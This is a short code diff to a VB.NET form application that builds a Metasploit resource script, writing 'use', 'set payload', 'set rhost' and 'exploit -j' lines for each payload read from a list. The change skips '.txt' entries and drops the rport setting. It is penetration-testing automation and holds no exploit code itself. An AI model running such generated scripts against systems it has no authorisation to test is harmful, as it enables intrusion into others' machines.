@@ -112,11 +112,16 @@ Public Class Form1
             Dim c As New StringBuilder
             While myStreamReader.Peek <> -1
                 Dim payload As String = myStreamReader.ReadLine
-                c.AppendLine("use " & exploit)
-                c.AppendLine("set payload " & payload)
-                c.AppendLine("set rhost " & rhost)
-                c.AppendLine("set rport " & rport)
-                c.AppendLine("exploit -j")
+                If exploit.Contains(".txt") Then
+                Else
+                    If payload.Contains(".txt") Then
+                    Else
+                        c.AppendLine("use " & exploit)
+                        c.AppendLine("set payload " & payload)
+                        c.AppendLine("set rhost " & rhost)
+                        c.AppendLine("exploit -j")
+                    End If
+                End If
             End While
 
             My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\finalscript.txt", c.ToString, True)
